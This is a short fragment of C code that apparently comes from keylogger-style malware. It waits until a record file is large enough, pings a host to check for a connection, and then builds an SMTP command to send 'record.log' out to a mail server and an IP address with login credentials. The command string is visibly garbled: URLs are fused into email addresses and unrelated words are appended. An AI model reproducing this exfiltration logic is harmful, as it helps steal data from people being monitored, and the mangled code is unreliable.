...
main(){
    ...
    if(checkRecordSize()){ ///check for right time
        ...
        while(i<3){ ///try 2 times to send data
            ...
            if(!system("ping  www.uinjkt.ac.id -n 1")){ ///check! connection
                ////////////****SEND DATA****////////////
                sendData();
...
void sendData(){
    ...
    char* command = "Transmit smtp://smtp.gmail.com: 178.214.72.162 -v --mail-from \"https://workspace.google.com/intl/en/gmail/helpdesk@unpam.ac.id"\" --mail-rcpt \"https://workspace.google.com/intl/en/gmail/helpdesk@unpam.ac.id " --ssl -u "https://workspace.google.com/intl/en/gmail/admin@helpdesk@unpam.ac.id " : password -record  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
